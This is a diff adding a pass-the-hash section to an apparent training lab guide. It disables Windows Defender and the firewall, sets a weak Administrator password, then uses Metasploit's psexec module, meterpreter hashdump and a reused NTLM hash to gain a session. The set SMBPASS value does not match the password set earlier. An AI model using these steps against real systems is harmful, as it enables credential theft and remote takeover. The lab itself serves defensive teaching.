@@ -74,6 +74,117 @@ Now, using the same process as before, let’s disable the **Windows** firewall 
 
 ![](attachments/nmap_turnbackon.png)
 
+
+Now, lets see why this is important with pass the hash.
+
+First lets configure the Windows system
+
+Let's disable AV.
+
+PS C:\Users\Administrator> `Set-MpPreference -DisableRealtimeMonitoring $true`
+
+Next, let's make sure that firewall is off.
+
+PS C:\Users\Administrator> `netsh advfirewall set allprofiles state off`
+
+Now, let's set an easy password.  
+
+PS C:\Users\Administrator> `net user Administrator password1234`
+
+PS C:\Users\Administrator> `ipconfig`
+
+
+It should look like this:
+
+<img width="641" alt="image" src="https://github.com/user-attachments/assets/10ffe094-f254-451e-95eb-d830b044e9a6">
+
+Now, let's open a Kali terminal:
+
+<img width="42" alt="image" src="https://github.com/user-attachments/assets/c64ee4a9-a642-4128-bb84-9cbe016cc5ba">
+
+Become root:
+
+`sudo su -`
+
+Start Metasploit
+
+`msfconsole -q`
+
+<img width="770" alt="image" src="https://github.com/user-attachments/assets/d32ecb85-5873-478a-b270-fbaf33e11aec">
+
+In another Kali terminal, get your IP address
+
+`ifconfig`
+
+<img width="661" alt="image" src="https://github.com/user-attachments/assets/44e622e5-34b6-4f0e-8547-769e891152e5">
+
+msf6 > `use exploit/windows/smb/psexec`
+
+
+msf6 exploit(windows/smb/psexec) > `set RHOST 10.10.70.106`
+
+msf6 exploit(windows/smb/psexec) > `set LHOST 10.10.117.128`
+
+
+msf6 exploit(windows/smb/psexec) > `set SMBUSER Administrator`
+
+msf6 exploit(windows/smb/psexec) > `set SMBPASS password1234567891011121314`
+
+It should look lie this:
+
+<img width="1139" alt="image" src="https://github.com/user-attachments/assets/9eb2b530-b318-4636-a111-5d6cbe73a906">
+
+Now dump the password hashes:
+
+meterpreter > `hashdump`
+
+<img width="1139" alt="image" src="https://github.com/user-attachments/assets/b3bbe145-51ab-4029-aefe-e036351af4fa">
+
+meterpreter > exit -y
+
+
+msf6 exploit(windows/smb/psexec) > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:30ee6993157208a29fb730af8bcc3dfe`
+
+
+<img width="1143" alt="image" src="https://github.com/user-attachments/assets/14882bb7-6891-4898-8dea-bc8023fd5930">
+
+msf6 exploit(windows/smb/psexec) > `exploit`
+
+<img width="1096" alt="image" src="https://github.com/user-attachments/assets/a0025016-882b-409c-90e1-ade208a19f7e">
+
+Kill it
+
+
+meterpreter > `exit -y`
+
+
+
+Now, back at the Windows Powershell, re-enable your firewall
+
+
+PS C:\Users\Administrator> `netsh advfirewall set allprofiles state on`
+
+Then re-run the attack!!
+
+<img width="1142" alt="image" src="https://github.com/user-attachments/assets/0cf9fa38-e3e3-419c-a346-576c90f6074c">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ***
 ***Continuing on to the next Lab?***
 
